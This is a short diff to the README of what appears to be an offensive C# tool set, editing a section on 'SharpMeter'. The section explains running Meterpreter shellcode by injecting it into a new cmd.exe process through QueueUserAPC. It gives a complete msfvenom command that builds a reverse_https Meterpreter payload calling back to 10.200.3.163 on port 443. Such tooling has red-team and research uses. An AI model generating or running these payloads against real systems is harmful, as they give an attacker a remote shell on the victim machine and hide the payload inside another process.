@@ -15,7 +15,7 @@ sharpthrough.exe IP PORT
 ## SharpMeter
 Executing Meterpreter generated shellcode via QueueUserAPC:  
 (create a new process, "cmd.exe" in this case, and injects and executes shellcode in process memory).  
-First, generate your payload in C# format, like this :  
+First, generate your Meterpreter payload in C# format, like this :  
 ```msfvenom -a x64 -p windows/x64/meterpreter/reverse_https  lhost=10.200.3.163 lport=443 -f csharp -o pay.txt```  
 Watch out to your architecture choice! x64 payload will only work with x64 executable version of sharpmeter.  
 Do not touch generated payload format (not even the variable name)! Leave it as it is.
